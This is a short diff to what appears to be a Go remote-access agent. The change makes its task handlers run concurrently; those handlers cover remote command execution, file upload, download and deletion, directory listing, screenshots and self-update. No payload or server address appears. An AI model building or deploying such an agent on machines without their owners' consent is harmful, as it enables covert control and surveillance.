@@ -130,21 +130,21 @@ func main() {
 		log.Println("Received task", body)
 		switch ttype {
 		case "execute_cmd":
-			executeCmdTask(&client, id, body)
+			go executeCmdTask(&client, id, body)
 		case "proclist":
 			proclistTask(&client, id, body)
 		case "downloadfile":
-			downloadFileTask(&client, id, body)
+			go downloadFileTask(&client, id, body)
 		case "uploadfile":
-			uploadFileTask(&client, id, body)
+			go uploadFileTask(&client, id, body)
 		case "dircontents":
-			dirContentsTask(&client, id, body)
+			go dirContentsTask(&client, id, body)
 		case "deletefile":
-			deleteFileTask(&client, id, body)
+			go deleteFileTask(&client, id, body)
 		case "movefile":
-			moveFileTask(&client, id, body)
+			go moveFileTask(&client, id, body)
 		case "screenshot":
-			screenshotTask(&client, id, body)
+			go screenshotTask(&client, id, body)
 		case "update":
 			selfUpdateTask(&client, id, body)
 
